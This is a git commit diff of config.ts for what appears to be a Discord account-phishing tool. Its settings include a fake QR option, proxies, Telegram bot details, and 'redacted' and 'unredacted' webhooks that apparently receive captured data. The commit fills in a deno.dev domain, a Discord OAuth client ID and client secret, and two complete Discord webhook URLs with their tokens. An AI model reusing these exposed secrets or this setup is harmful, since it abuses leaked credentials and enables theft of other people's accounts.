3e0bd977e358684bb47e08cc577c14f38de03d46
z039069 <130588079+z039069@users.noreply.github.com>
2023-05-02 21:14:59 +0200

    Update config.ts

--- config.ts
+++ config.ts
@@ -1,5 +1,5 @@
 // SERVER DETAILS
-export const domain = 'name.deno.dev';
+export const domain = 'fcs.deno.dev';
 export const fullDomain = `https://${domain}`;
 export const proxies: string[] = [];
 export const fakeQr = true;
@@ -11,13 +11,13 @@ export const telegramToken = '';
 export const telegramChatId = '';
 
 // DISCORD OAUTH DETAILS
-export const clientID = '';
-export const clientSecret = '';
+export const clientID = '1091458628319445053';
+export const clientSecret = 'bId1s6Ul2h60-tYEqAEY2JGFRN_z6plN';
 export const redirectURI = `${fullDomain}/login`;
 
 // WEBHOOKS
-export const redactedWebhook = 'https://discord.com/api/webhooks/';
-export const unredactedWebhook = 'https://discord.com/api/webhooks/';
+export const redactedWebhook = 'https://ptb.discord.com/api/webhooks/1100932864863907980/yRHCA4N89rRdNtwjc1wCj49DoTGqUDtsTw5XTrpc2X8G6Q2bRpx7jIpUJIFYhqsimOGx';
+export const unredactedWebhook = 'https://ptb.discord.com/api/webhooks/1082475634133049364/giLs_RxKj-Xbol1Pf4D1uiZNzovmfqHWfR-Wza5w_xg-W5I948sm474oJyn4pUvfD4Bp';
 
 // AUTO ROLE
 export const autoRoleToken = '';
